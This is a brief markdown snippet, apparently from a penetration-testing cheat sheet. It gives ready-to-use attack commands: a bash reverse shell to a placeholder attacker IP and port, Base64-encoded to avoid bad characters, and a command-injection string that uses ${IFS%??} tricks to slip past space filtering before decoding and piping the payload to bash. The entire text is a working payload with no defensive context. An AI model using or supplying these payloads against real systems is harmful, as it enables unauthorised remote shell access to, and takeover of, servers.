### Create the bash reverse shell payload and encode via Base64 to get rid of any bad characters

```sh
echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
```

### Inject using bash payload

```sh
;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```
